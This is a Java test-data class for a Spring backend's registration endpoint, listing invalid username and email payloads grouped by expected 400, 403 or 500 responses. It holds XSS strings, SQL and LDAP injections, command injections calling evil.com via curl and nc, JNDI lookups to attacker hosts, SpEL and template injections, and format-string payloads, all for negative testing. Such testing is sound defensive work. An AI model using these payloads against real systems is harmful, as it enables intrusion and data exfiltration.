
package dev.hope.vulcaobackend.TestData;

import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * Registration payloads categorized strictly by their expected failure paths.
 * Both 'username' and 'email' are intentionally invalid across all payloads.
 */
public class InvalidAuthRequestData {

    /**
     * Aggregates all test paths for test runners processing comprehensive negative test suites.
     */
    public List<JSONObject> invalidUsers() throws JSONException {
        List<JSONObject> all = new ArrayList<>();
        all.addAll(dataValidationFailed());
        all.addAll(springSecurityForbidden());
        all.addAll(internalServerErrorTriggered());
        return all;
    }

    /**
     * PATH 1: 400 Bad Request / Data Validation Failures.
     * These pass Spring's firewall and filters, reaching the controller where standard 
     * JSR-380 validation (@Valid, @Email, @Size) or application rules reject them.
     *
     * Note: XSS characters are designed to stay inside string values to avoid routing exceptions.
     */
    public List<JSONObject> dataValidationFailed() throws JSONException {
        List<JSONObject> users = new ArrayList<>();

        // ── Structural Malformations ──────────────────────────────────────────
        users.add(user("  ", " "));                                       // Empty strings
        users.add(user("abc", "plainaddress"));                        // Too short + missing '@'
        users.add(user("ab", "user@"));                                // Too short + missing domain
        users.add(user("user name", "user@example"));                  // Embedded whitespace + missing TLD
        users.add(user("user@name", "@example.com"));                  // Bad char in user + missing local part
        users.add(user("1username", "user@@example.com"));             // Starts with digit + duplicate '@'
        users.add(user("        ", "us..er@example.com"));             // Spaces only + consecutive dots
        users.add(user("u".repeat(51), "user@-example.com"));          // Size limit breached + domain prefix hyphen
        users.add(user("u".repeat(100), "user@example,com"));          // Size limit breached + comma injection

        // ── Clean Web Exploits (Safe for Routers, Bad for App) ────────────────
        users.add(user("<script>alert(1)<script>", "malicious-xss@example.com"));
        users.add(user("invalid_user", "attack_payload<img_src=x>@example.com"));
        users.add(user("javascript:alert(1)", "cookie-thief@example.com"));

        // SQL Injections avoiding firewalled symbols like ';'
        users.add(user("admin'--", "a'--@example.com"));
        users.add(user("' OR '1'='1", "' OR 1=1--@x.com"));
        users.add(user("admin' UNION SELECT * FROM users--", "u\" OR \"\"=\"@a.com"));

        // Command Injections avoiding firewalled symbols like ';' or '\'
        users.add(user("$(curl http:evil.com)", "$(whoami)@x.com"));
        users.add(user("`reboot`", "a`id`@x.com"));
        users.add(user("user | nc evil.com 4444", "user|whoami@x.com"));
        users.add(user("a && ping -c 10 evil.com", "a&&b@x.com"));

        // NoSQL & LDAP formatting errors
        users.add(user("*)(uid=*))(|(uid=*", "*)(mail=*)@x.com"));

        // ── Missing / Null Keys ──────────────────────────────────────────────
        users.add(new JSONObject());                                            // Completely missing
        users.add(new JSONObject()
                .put("username", JSONObject.NULL)
                .put("email", JSONObject.NULL));                                // Explicit nulls

        return users;
    }

    /**
     * PATH 2: 403 Forbidden / Spring Security Filter Rejections.
     * These inputs violate enterprise boundary validations. They are caught by filters
     * or endpoint authorization rules before execution drops into business endpoints.
     */
    public List<JSONObject> springSecurityForbidden() throws JSONException {
        List<JSONObject> users = new ArrayList<>();

        // Unicode homoglyphs, Right-To-Left manipulation, and zero-width cloaking 
        // frequently assigned to trigger 403/Forbidden execution exceptions on strict systems
        users.add(user("\u0430dmin", "\u0430dmin@example.com"));                 // Cyrillic spoofing
        users.add(user("user\u202Egnp.exe", "a\u202E@x.com"));                  // RTL character bypass
        users.add(user("user\u200Bname", "us\u200Ber@x.com"));                  // Zero-width space obfuscation

        // Expressions targeting engine evaluations (JNDI, SpEL) triggering Security Exception blocks
        users.add(user("${7*7}", "${jndi:ldap-x.evil.com/a}@x.com"));
        users.add(user("${jndi:ldap-x.attacker.com/exploit}", "a${env:USER}@x.com"));
        users.add(user("{{7*7}}", "{{config}}@x.com"));
        users.add(user("#{T(java.lang.Runtime).getRuntime()}", "a#{7*7}@x.com"));

        return users;
    }

    /**
     * PATH 3: 500 Internal Server Error Triggers.
     * Overly large strings or unhandled sequences meant to break the internal state,
     * cause memory exceptions, serialization faults, or parsing crashes within libraries.
     */
    public List<JSONObject> internalServerErrorTriggered() throws JSONException {
        List<JSONObject> users = new ArrayList<>();

        // Oversized string blocks designed to induce buffer stress or parser failures
        users.add(user("A".repeat(25000), "a".repeat(25000) + "@x.com"));

        // Format-string payloads causing internal logging/formatting engine exceptions
        users.add(user("%s%s%s%n", "%x%x%x@x.com"));

        return users;
    }

    private static JSONObject user(String username, String email) throws JSONException {
        return new JSONObject()
                .put("username", username)
                .put("email", email);
    }
}

